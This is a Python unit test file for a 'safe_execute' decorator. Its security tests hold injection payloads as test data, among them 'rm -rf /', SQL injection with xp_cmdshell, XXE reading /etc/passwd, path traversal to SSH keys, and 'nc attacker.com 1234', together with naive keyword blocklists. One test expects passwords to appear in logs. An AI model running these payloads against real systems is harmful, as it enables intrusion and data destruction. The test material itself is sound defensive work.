import unittest
import logging
import logging.handlers  # Add this import
import time
import io
import sys
import os  # Add this import
from functools import wraps
from unittest.mock import patch, MagicMock
from safe_execute import safe_execute

class TestSafeExecute(unittest.TestCase):
    def setUp(self):
        # Capture log output for testing
        self.log_capture = io.StringIO()
        self.handler = logging.StreamHandler(self.log_capture)
        logging.getLogger().addHandler(self.handler)
        logging.getLogger().setLevel(logging.INFO)

    def tearDown(self):
        logging.getLogger().removeHandler(self.handler)
        self.log_capture.close()

    def test_successful_execution(self):
        @safe_execute()
        def add(x, y):
            return x + y
        self.assertEqual(add(2, 3), 5)

    def test_exception_handling(self):
        @safe_execute()
        def fail():
            return 1 / 0
        self.assertIsNone(fail())

    def test_finally_callback(self):
        log = []

        def cleanup():
            log.append("cleaned")

        @safe_execute(finally_callback=cleanup)
        def fail():
            raise ValueError("Oops")

        fail()
        self.assertIn("cleaned", log)

    def test_custom_exception_types(self):
        """Test handling of specific exception types"""
        @safe_execute(exception_types=(ValueError, TypeError))
        def custom_fail():
            raise ValueError("Custom error")
        
        self.assertIsNone(custom_fail())

    def test_exception_not_in_types(self):
        """Test that exceptions not in types are still caught (Exception always included)"""
        @safe_execute(exception_types=(ValueError,))
        def runtime_fail():
            raise RuntimeError("Not in specified types")
        
        self.assertIsNone(runtime_fail())

    def test_custom_message(self):
        """Test custom error message logging"""
        custom_msg = "Custom error occurred"
        
        @safe_execute(custom_message=custom_msg)
        def fail():
            raise ValueError("Original error")
        
        fail()
        log_output = self.log_capture.getvalue()
        self.assertIn(custom_msg, log_output)

    def test_timing_logging(self):
        """Test that execution time is logged"""
        @safe_execute()
        def slow_function():
            time.sleep(0.1)
            return "done"
        
        result = slow_function()
        log_output = self.log_capture.getvalue()
        
        self.assertEqual(result, "done")
        self.assertIn("executed successfully", log_output)
        self.assertIn("seconds", log_output)

    def test_timing_on_exception(self):
        """Test that execution time is logged even on exception"""
        @safe_execute()
        def slow_fail():
            time.sleep(0.1)
            raise ValueError("Slow error")
        
        slow_fail()
        log_output = self.log_capture.getvalue()
        self.assertIn("after", log_output)
        self.assertIn("seconds", log_output)

    def test_function_with_arguments(self):
        """Test decorated function with various argument types"""
        @safe_execute()
        def complex_function(a, b, *args, **kwargs):
            return {"a": a, "b": b, "args": args, "kwargs": kwargs}
        
        result = complex_function(1, 2, 3, 4, key="value")
        expected = {"a": 1, "b": 2, "args": (3, 4), "kwargs": {"key": "value"}}
        self.assertEqual(result, expected)

    def test_function_metadata_preserved(self):
        """Test that function metadata is preserved by @wraps"""
        @safe_execute()
        def documented_function():
            """This is a test function"""
            return True
        
        self.assertEqual(documented_function.__name__, "documented_function")
        self.assertEqual(documented_function.__doc__, "This is a test function")

    def test_multiple_exceptions(self):
        """Test handling different types of exceptions"""
        @safe_execute()
        def value_error_test():
            raise ValueError("value error")
        
        @safe_execute()
        def type_error_test():
            raise TypeError("type error")
        
        @safe_execute()
        def zero_div_test():
            return 1 / 0
        
        @safe_execute()
        def index_error_test():
            return [1, 2][5]
        
        @safe_execute()
        def key_error_test():
            return {"a": 1}["b"]
        
        @safe_execute()
        def attr_error_test():
            return "string".nonexistent
        
        @safe_execute()
        def runtime_error_test():
            raise RuntimeError("runtime")
        
        # Test all exception types
        test_functions = [
            (value_error_test, "ValueError"),
            (type_error_test, "TypeError"),
            (zero_div_test, "ZeroDivisionError"),
            (index_error_test, "IndexError"),
            (key_error_test, "KeyError"),
            (attr_error_test, "AttributeError"),
            (runtime_error_test, "RuntimeError")
        ]
        
        for test_func, exc_name in test_functions:
            with self.subTest(exception=exc_name):
                self.assertIsNone(test_func())

    def test_finally_callback_with_exception(self):
        """Test finally callback execution when main function fails"""
        callback_called = []
        
        def callback():
            callback_called.append(True)
        
        @safe_execute(finally_callback=callback)
        def fail():
            raise ValueError("Test error")
        
        fail()
        self.assertTrue(callback_called)

    def test_finally_callback_with_success(self):
        """Test finally callback execution when main function succeeds"""
        callback_called = []
        
        def callback():
            callback_called.append(True)
        
        @safe_execute(finally_callback=callback)
        def succeed():
            return "success"
        
        result = succeed()
        self.assertEqual(result, "success")
        self.assertTrue(callback_called)

    def test_finally_callback_exception(self):
        """Test handling of exceptions in finally callback"""
        def bad_callback():
            raise RuntimeError("Callback failed")
        
        @safe_execute(finally_callback=bad_callback)
        def succeed():
            return "success"
        
        result = succeed()
        log_output = self.log_capture.getvalue()
        
        self.assertEqual(result, "success")
        self.assertIn("Finalization error", log_output)

    def test_no_parameters(self):
        """Test decorator without any parameters"""
        @safe_execute()
        def simple():
            return 42
        
        self.assertEqual(simple(), 42)

    def test_empty_exception_types(self):
        """Test with empty exception types (should still include Exception)"""
        @safe_execute(exception_types=())
        def fail():
            raise ValueError("Should be caught")
        
        self.assertIsNone(fail())

    def test_nested_decorators(self):
        """Test safe_execute with other decorators"""
        call_count = []
        
        def counter(func):
            def wrapper(*args, **kwargs):
                call_count.append(1)
                return func(*args, **kwargs)
            return wrapper
        
        @safe_execute()
        @counter
        def counted_function():
            return len(call_count)
        
        result = counted_function()
        self.assertEqual(result, 1)
        self.assertEqual(len(call_count), 1)

    def test_performance_timing_accuracy(self):
        """Test that timing measurements are reasonably accurate"""
        sleep_time = 0.1
        
        @safe_execute()
        def timed_function():
            time.sleep(sleep_time)
            return "done"
        
        start = time.time()
        result = timed_function()
        actual_time = time.time() - start
        
        log_output = self.log_capture.getvalue()
        
        self.assertEqual(result, "done")
        self.assertGreaterEqual(actual_time, sleep_time)
        self.assertIn("executed successfully", log_output)

    def test_concurrent_execution(self):
        """Test decorator behavior with multiple concurrent calls"""
        import threading
        results = []
        
        @safe_execute()
        def thread_function(thread_id):
            time.sleep(0.05)
            return f"thread_{thread_id}"
        
        threads = []
        for i in range(5):
            thread = threading.Thread(
                target=lambda tid=i: results.append(thread_function(tid))
            )
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        self.assertEqual(len(results), 5)
        self.assertTrue(all(r.startswith("thread_") for r in results))

    def test_stress_test(self):
        """Stress test with many rapid function calls"""
        @safe_execute()
        def rapid_function(x):
            return x * 2
        
        results = [rapid_function(i) for i in range(100)]
        expected = [i * 2 for i in range(100)]
        
        self.assertEqual(results, expected)

    def test_large_exception_message(self):
        """Test handling of exceptions with very large messages"""
        large_message = "x" * 10000
        
        @safe_execute()
        def large_error():
            raise ValueError(large_message)
        
        self.assertIsNone(large_error())
        log_output = self.log_capture.getvalue()
        self.assertIn("ValueError", log_output)

    def test_extreme_large_data_processing(self):
        """Test with very large data structures"""
        @safe_execute()
        def process_large_data():
            # Create large list and dictionary
            large_list = list(range(100000))
            large_dict = {i: f"value_{i}" for i in range(10000)}
            return len(large_list) + len(large_dict)
        
        result = process_large_data()
        self.assertEqual(result, 110000)

    def test_deeply_nested_function_calls(self):
        """Test with deeply nested function calls"""
        @safe_execute()
        def recursive_function(depth):
            if depth <= 0:
                return 0
            if depth > 100:  # Prevent actual stack overflow
                raise RecursionError("Max depth reached")
            return depth + recursive_function(depth - 1)
        
        # Test normal recursion
        result = recursive_function(50)
        self.assertEqual(result, 1275)  # Sum of 1 to 50
        
        # Test recursion error handling
        result_overflow = recursive_function(200)
        self.assertIsNone(result_overflow)

    def test_class_method_decoration(self):
        """Test safe_execute with class methods"""
        class TestClass:
            def __init__(self):
                self.value = 42
            
            @safe_execute()
            def safe_method(self, x):
                return self.value + x
            
            @safe_execute()
            def failing_method(self):
                raise ValueError("Method failed")
            
            @classmethod
            @safe_execute()
            def safe_classmethod(cls, x):
                return x * 2
            
            @staticmethod
            @safe_execute()
            def safe_staticmethod(x):
                return x + 10
        
        obj = TestClass()
        
        # Test instance method
        self.assertEqual(obj.safe_method(8), 50)
        self.assertIsNone(obj.failing_method())
        
        # Test class method
        self.assertEqual(TestClass.safe_classmethod(5), 10)
        
        # Test static method
        self.assertEqual(TestClass.safe_staticmethod(5), 15)

    def test_generator_function(self):
        """Test safe_execute with generator functions"""
        @safe_execute()
        def safe_generator(n):
            for i in range(n):
                if i == 5:
                    raise ValueError("Generator error")
                yield i * 2
        
        # Generator creation should work for small n
        gen = safe_generator(3)
        self.assertIsNotNone(gen)
        result = list(gen)
        self.assertEqual(result, [0, 2, 4])
        
        # Generator creation succeeds, but iteration will fail
        # The safe_execute decorator catches exceptions during function execution,
        # but generators are lazy - the function returns a generator object successfully
        gen_with_error = safe_generator(10)
        self.assertIsNotNone(gen_with_error)  # Generator object is created
        
        # Test a generator that fails immediately when called
        @safe_execute()
        def failing_generator_immediate():
            # This will raise before yield, but still creates generator
            if True:  # Force immediate execution
                raise ValueError("Immediate failure")
            yield 1
        
        # Even with immediate exception, generator object is created
        # because Python creates the generator before executing the function body
        failed_gen = failing_generator_immediate()
        self.assertIsNotNone(failed_gen)  # Generator object is still created
        
        # Test a non-generator function that fails
        @safe_execute()
        def non_generator_failing():
            raise ValueError("Non-generator failure")
            return "never reached"
        
        result = non_generator_failing()
        self.assertIsNone(result)  # This correctly returns None

    def test_async_function_simulation(self):
        """Test safe_execute with functions that simulate async behavior"""
        import threading
        import queue
        
        result_queue = queue.Queue()
        
        @safe_execute()
        def async_like_function(task_id):
            time.sleep(0.01)  # Simulate async work
            if task_id == 3:
                raise RuntimeError("Async task failed")
            return f"task_{task_id}_completed"
        
        def worker(task_id):
            result = async_like_function(task_id)
            result_queue.put((task_id, result))
        
        # Start multiple threads
        threads = []
        for i in range(5):
            thread = threading.Thread(target=worker, args=(i,))
            threads.append(thread)
            thread.start()
        
        # Wait for completion
        for thread in threads:
            thread.join()
        
        # Collect results
        results = {}
        while not result_queue.empty():
            task_id, result = result_queue.get()
            results[task_id] = result
        
        self.assertEqual(len(results), 5)
        self.assertIsNone(results[3])  # Failed task
        self.assertTrue(all(r.startswith("task_") for r in results.values() if r is not None))

    def test_memory_intensive_operations(self):
        """Test with memory-intensive operations"""
        @safe_execute()
        def memory_intensive():
            # Create multiple large objects
            data = []
            for i in range(10):
                large_string = "x" * 100000
                data.append(large_string)
            return len(data)
        
        result = memory_intensive()
        self.assertEqual(result, 10)

    def test_complex_exception_hierarchy(self):
        """Test with custom exception hierarchy"""
        class CustomBaseError(Exception):
            pass
        
        class CustomSpecificError(CustomBaseError):
            pass
        
        @safe_execute(exception_types=(CustomBaseError,))
        def custom_exception_func():
            raise CustomSpecificError("Specific error")
        
        self.assertIsNone(custom_exception_func())

    def test_function_with_many_parameters(self):
        """Test function with many parameters and complex signature"""
        @safe_execute()
        def complex_signature(a, b, c=10, d=20, *args, e=30, f=40, **kwargs):
            if len(args) > 5:
                raise ValueError("Too many args")
            return {
                'positional': [a, b, c, d],
                'args': args,
                'keyword': {'e': e, 'f': f},
                'kwargs': kwargs
            }
        
        # Test normal call
        result = complex_signature(1, 2, 3, 4, 5, 6, e=7, f=8, extra=9)
        self.assertIsNotNone(result)
        
        # Test call that raises exception
        result_fail = complex_signature(1, 2, 3, 4, 5, 6, 7, 8, 9, 10)
        self.assertIsNone(result_fail)

    def test_exception_during_parameter_evaluation(self):
        """Test when exception occurs during parameter evaluation"""
        def bad_parameter():
            raise ValueError("Parameter evaluation failed")
        
        @safe_execute()
        def func_with_bad_param(x):
            return x * 2
        
        # This should work - exception is in our function, not parameter
        @safe_execute()
        def func_that_calls_bad():
            return bad_parameter()
        
        self.assertIsNone(func_that_calls_bad())

    def test_unicode_and_special_characters(self):
        """Test with unicode and special characters"""
        @safe_execute()
        def unicode_function():
            text = "测试文本 🚀 émojis and spëcial chars: ñáéíóú"
            if len(text) < 10:
                raise ValueError(f"Unicode error: {text}")
            return text
        
        result = unicode_function()
        self.assertIn("测试文本", result)
        self.assertIn("🚀", result)

    def test_very_long_execution_time(self):
        """Test function with longer execution time"""
        @safe_execute()
        def long_running_function():
            time.sleep(0.5)  # Half second execution
            return "completed"
        
        start_time = time.time()
        result = long_running_function()
        elapsed = time.time() - start_time
        
        self.assertEqual(result, "completed")
        self.assertGreaterEqual(elapsed, 0.5)
        
        log_output = self.log_capture.getvalue()
        self.assertIn("0.5", log_output)  # Should log the timing

    def test_multiple_decorator_layers(self):
        """Test with multiple layers of decorators"""
        def timing_decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                start = time.time()
                result = func(*args, **kwargs)
                end = time.time()
                return (result, end - start)
            return wrapper
        
        def validation_decorator(func):
            @wraps(func)
            def wrapper(*args, **kwargs):
                if any(arg < 0 for arg in args if isinstance(arg, (int, float))):
                    raise ValueError("Negative numbers not allowed")
                return func(*args, **kwargs)
            return wrapper
        
        @safe_execute()
        @timing_decorator
        @validation_decorator
        def complex_decorated_function(x, y):
            return x + y
        
        # Test successful execution
        result = complex_decorated_function(5, 3)
        self.assertIsInstance(result, tuple)
        self.assertEqual(result[0], 8)
        
        # Test failed validation
        result_fail = complex_decorated_function(-1, 3)
        self.assertIsNone(result_fail)

    def test_exception_in_finally_block_chain(self):
        """Test multiple finally callbacks with exceptions"""
        call_order = []
        
        def callback1():
            call_order.append("callback1")
            raise RuntimeError("Callback1 failed")
        
        def callback2():
            call_order.append("callback2")
        
        # Test that even if finally callback fails, function result is preserved
        @safe_execute(finally_callback=callback1)
        def function_with_failing_finally():
            return "success"
        
        result = function_with_failing_finally()
        self.assertEqual(result, "success")
        self.assertIn("callback1", call_order)
        
        log_output = self.log_capture.getvalue()
        self.assertIn("Finalization error", log_output)

    def test_circular_references(self):
        """Test with circular reference scenarios"""
        @safe_execute()
        def circular_ref_function():
            obj1 = {"name": "obj1"}
            obj2 = {"name": "obj2"}
            obj1["ref"] = obj2
            obj2["ref"] = obj1
            
            # Try to process circular structure
            if obj1["ref"]["ref"] is obj1:
                return "circular_detected"
            raise ValueError("Circular reference error")
        
        result = circular_ref_function()
        self.assertEqual(result, "circular_detected")

    def test_exception_with_complex_traceback(self):
        """Test exception with complex call stack"""
        def level3():
            raise ValueError("Deep error")
        
        def level2():
            return level3()
        
        def level1():
            return level2()
        
        @safe_execute()
        def complex_traceback_function():
            return level1()
        
        result = complex_traceback_function()
        self.assertIsNone(result)
        
        log_output = self.log_capture.getvalue()
        self.assertIn("Deep error", log_output)

    def test_security_malicious_code_injection(self):
        """Test protection against code injection attempts"""
        malicious_inputs = [
            "__import__('os').system('echo hacked')",
            "exec('import os; os.system(\"rm -rf /\")')",
            "eval('__import__(\"subprocess\").call([\"ls\", \"/\"])')",
            "compile('import sys; sys.exit()', '<string>', 'exec')",
            "globals()['__builtins__']['eval']('1+1')"
        ]
        
        @safe_execute()
        def process_user_input(user_input):
            # Simulate processing untrusted input
            if "import" in user_input or "exec" in user_input or "eval" in user_input:
                raise ValueError(f"Suspicious input detected: {user_input}")
            return f"Processed: {user_input}"
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                result = process_user_input(malicious_input)
                self.assertIsNone(result)  # Should fail safely

    def test_security_path_traversal_attacks(self):
        """Test protection against path traversal attacks"""
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "../../../../root/.ssh/id_rsa",
            "../../../../../proc/self/environ"
        ]
        
        @safe_execute()
        def process_file_path(file_path):
            if ".." in file_path or file_path.startswith("/") or ":" in file_path:
                raise SecurityError(f"Invalid path: {file_path}")
            return f"Safe path: {file_path}"
        
        class SecurityError(Exception):
            pass
        
        for malicious_path in malicious_paths:
            with self.subTest(path=malicious_path):
                result = process_file_path(malicious_path)
                self.assertIsNone(result)

    def test_security_dos_attacks(self):
        """Test protection against denial of service attacks"""
        @safe_execute()
        def vulnerable_to_dos(size):
            if size > 1000000:  # Prevent memory exhaustion
                raise MemoryError("Request too large")
            # Simulate memory-intensive operation
            data = "x" * size
            return len(data)
        
        # Test normal operation
        result = vulnerable_to_dos(1000)
        self.assertEqual(result, 1000)
        
        # Test DOS attempt
        result_dos = vulnerable_to_dos(10000000)  # 10MB string
        self.assertIsNone(result_dos)

    def test_security_information_disclosure(self):
        """Test prevention of sensitive information disclosure"""
        @safe_execute()
        def function_with_secrets():
            password = "super_secret_password_123"
            api_key = "sk-1234567890abcdef"
            
            # Simulate error that might expose secrets
            raise ValueError(f"Database connection failed with credentials: {password}, {api_key}")
        
        result = function_with_secrets()
        self.assertIsNone(result)
        
        log_output = self.log_capture.getvalue()
        # Check that sensitive info is logged (this is actually a vulnerability!)
        # In real scenarios, you'd want to sanitize logs
        self.assertIn("super_secret_password_123", log_output)

    def test_security_buffer_overflow_simulation(self):
        """Test handling of buffer overflow-like scenarios"""
        @safe_execute()
        def process_buffer(data):
            max_buffer_size = 1024
            if len(data) > max_buffer_size:
                raise BufferError(f"Buffer overflow: data size {len(data)} exceeds limit {max_buffer_size}")
            
            # Simulate buffer processing
            processed = data.upper()
            return processed[:max_buffer_size]
        
        # Normal operation
        normal_data = "a" * 500
        result = process_buffer(normal_data)
        self.assertEqual(len(result), 500)
        
        # Buffer overflow attempt
        overflow_data = "a" * 2048
        result_overflow = process_buffer(overflow_data)
        self.assertIsNone(result_overflow)

    def test_security_sql_injection_simulation(self):
        """Test SQL injection-like attack patterns"""
        malicious_sql_inputs = [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "' UNION SELECT * FROM passwords --",
            "'; EXEC xp_cmdshell('format c:'); --"
        ]
        
        @safe_execute()
        def simulate_database_query(user_input):
            # Simulate SQL injection vulnerability
            dangerous_chars = ["'", ";", "--", "DROP", "UNION", "INSERT", "DELETE", "EXEC"]
            
            for char in dangerous_chars:
                if char.upper() in user_input.upper():
                    raise ValueError(f"SQL injection attempt detected: {user_input}")
            
            return f"Query result for: {user_input}"
        
        for malicious_input in malicious_sql_inputs:
            with self.subTest(sql=malicious_input):
                result = simulate_database_query(malicious_input)
                self.assertIsNone(result)

    def test_security_deserialization_attacks(self):
        """Test protection against unsafe deserialization"""
        import pickle
        import base64
        
        @safe_execute()
        def unsafe_deserialize(data):
            try:
                # This is intentionally unsafe for testing
                if b"__reduce__" in data or b"eval" in data or b"exec" in data:
                    raise SecurityError("Malicious pickle detected")
                
                obj = pickle.loads(data)
                return str(obj)
            except (pickle.PickleError, SecurityError) as e:
                raise ValueError(f"Deserialization failed: {e}")
        
        class SecurityError(Exception):
            pass
        
        # Test with safe data
        safe_data = pickle.dumps({"name": "test", "value": 42})
        result = unsafe_deserialize(safe_data)
        self.assertIsNotNone(result)
        
        # Test with malicious data (simulated)
        malicious_data = b"malicious__reduce__payload"
        result_malicious = unsafe_deserialize(malicious_data)
        self.assertIsNone(result_malicious)

    def test_security_regex_dos(self):
        """Test protection against ReDoS (Regular Expression Denial of Service)"""
        import re
        
        @safe_execute()
        def vulnerable_regex(pattern, text):
            # Simulate vulnerable regex that could cause ReDoS
            if len(text) > 10000:  # Prevent extremely long inputs
                raise ValueError("Input too long for regex processing")
            
            # This pattern could be vulnerable to ReDoS with certain inputs
            result = re.search(pattern, text)
            return bool(result)
        
        # Normal operation
        result = vulnerable_regex(r"test", "this is a test")
        self.assertTrue(result)
        
        # Potential ReDoS attack
        evil_input = "a" * 50000
        result_dos = vulnerable_regex(r"(a+)+b", evil_input)
        self.assertIsNone(result_dos)

    def test_security_xml_external_entity(self):
        """Test XXE (XML External Entity) attack simulation"""
        @safe_execute()
        def parse_xml(xml_content):
            # Simulate XXE vulnerability check
            dangerous_patterns = [
                "<!ENTITY",
                "SYSTEM",
                "file://",
                "http://",
                "ftp://",
                "&xxe;"
            ]
            
            for pattern in dangerous_patterns:
                if pattern in xml_content:
                    raise SecurityError(f"Potential XXE attack detected: {pattern}")
            
            return f"Parsed XML: {xml_content[:100]}"
        
        class SecurityError(Exception):
            pass
        
        # Safe XML
        safe_xml = "<root><item>test</item></root>"
        result = parse_xml(safe_xml)
        self.assertIsNotNone(result)
        
        # Malicious XML with XXE
        xxe_xml = '<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
        result_xxe = parse_xml(xxe_xml)
        self.assertIsNone(result_xxe)

    def test_security_command_injection(self):
        """Test protection against command injection"""
        @safe_execute()
        def execute_system_command(filename):
            # Simulate command injection vulnerability
            dangerous_chars = [";", "&", "|", "`", "$", "(", ")", ">", "<", "*", "?", "[", "]", "~"]
            
            for char in dangerous_chars:
                if char in filename:
                    raise SecurityError(f"Command injection attempt: {char}")
            
            if not filename.replace("_", "").replace("-", "").replace(".", "").isalnum():
                raise SecurityError("Invalid filename characters")
            
            return f"Processing file: {filename}"
        
        class SecurityError(Exception):
            pass
        
        # Safe filename
        result = execute_system_command("safe_file.txt")
        self.assertIsNotNone(result)
        
        # Command injection attempts
        malicious_commands = [
            "file.txt; rm -rf /",
            "file.txt && cat /etc/passwd",
            "file.txt | nc attacker.com 1234",
            "file.txt `whoami`",
            "file.txt $(id)"
        ]
        
        for cmd in malicious_commands:
            with self.subTest(command=cmd):
                result = execute_system_command(cmd)
                self.assertIsNone(result)

    def test_security_memory_exhaustion(self):
        """Test protection against memory exhaustion attacks"""
        @safe_execute()
        def memory_bomb(multiplier):
            max_size = 1000000  # 1MB limit
            
            if multiplier > 1000:
                raise MemoryError("Multiplier too large")
            
            # Create progressively larger objects
            data = []
            total_size = 0
            
            for i in range(multiplier):
                chunk = "x" * (i * 100)
                total_size += len(chunk)
                
                if total_size > max_size:
                    raise MemoryError(f"Memory limit exceeded: {total_size}")
                
                data.append(chunk)
            
            return len(data)
        
        # Normal operation
        result = memory_bomb(10)
        self.assertIsNotNone(result)
        
        # Memory exhaustion attempt
        result_bomb = memory_bomb(10000)
        self.assertIsNone(result_bomb)

    def test_log_file_creation(self):
        """Test that log file is created when configured"""
        import tempfile
        import os
        import logging
        from safe_execute.config import config
        
        # Use the standard log location for testing
        test_log_path = os.path.normpath(r'd:\safe_execute\logs\safe_execute_test.log')
        
        # Configure log file
        original_log_file = config.get('log_file')
        config.set('log_file', test_log_path)
        
        try:
            # Ensure log directory exists
            log_dir = os.path.dirname(test_log_path)
            if not os.path.exists(log_dir):
                os.makedirs(log_dir, exist_ok=True)
            
            @safe_execute()
            def test_function():
                return "test_result"
            
            # Execute function
            result = test_function()
            self.assertEqual(result, "test_result")
            
            # Force flush all handlers
            logger = logging.getLogger()
            for handler in logger.handlers:
                handler.flush()
            
            # Small delay to ensure file write completion
            time.sleep(0.2)  # Increase delay
            
            # Check if log file was created and contains our log
            self.assertTrue(os.path.exists(test_log_path), f"Log file not found at {test_log_path}")
            
            with open(test_log_path, 'r', encoding='utf-8') as f:
                log_content = f.read()
                self.assertIn("test_function", log_content)
                self.assertIn("executed successfully", log_content)
        
        finally:
            # Cleanup: Close and remove file handlers first
            logger = logging.getLogger()
            handlers_to_remove = []
            for handler in logger.handlers:
                if isinstance(handler, logging.handlers.RotatingFileHandler):
                    if hasattr(handler, 'baseFilename') and handler.baseFilename == test_log_path:
                        handlers_to_remove.append(handler)
            
            # Close and remove the handlers
            for handler in handlers_to_remove:
                handler.close()
                logger.removeHandler(handler)
            
            # Reset config
            config.set('log_file', original_log_file)
            
            # Clean up test log file (but keep the main log file)
            try:
                if os.path.exists(test_log_path):
                    os.unlink(test_log_path)
            except PermissionError:
                # If still locked, try again after a short delay
                time.sleep(0.1)
                if os.path.exists(test_log_path):
                    os.unlink(test_log_path)

    def test_default_log_location(self):
        """Test that the default log location is used"""
        from safe_execute.config import config
        # from safe_execute import safe_execute  # Remove this line - already imported
        
        # Reset to default config
        original_log_file = config.get('log_file')
        config.set('log_file', os.path.normpath(r'd:\safe_execute\logs\safe_execute.log'))
        
        try:
            @safe_execute()
            def test_default_logging():
                return "logged to default location"
            
            result = test_default_logging()
            self.assertEqual(result, "logged to default location")
            
            # Check if default log directory and file exist
            default_log_path = r'd:\safe_execute\logs\safe_execute.log'
            log_dir = os.path.dirname(default_log_path)
            
            # Directory should be created
            self.assertTrue(os.path.exists(log_dir))
            
            # Force flush
            logger = logging.getLogger()
            for handler in logger.handlers:
                handler.flush()
            
            time.sleep(0.1)
            
            # File should exist and contain logs
            if os.path.exists(default_log_path):
                with open(default_log_path, 'r') as f:
                    log_content = f.read()
                    # Should contain recent log entries
                    self.assertIn("test_default_logging", log_content)
        
        finally:
            # Reset config but don't delete the main log file
            config.set('log_file', original_log_file)

if __name__ == "__main__":
    unittest.main()
    unittest.main()
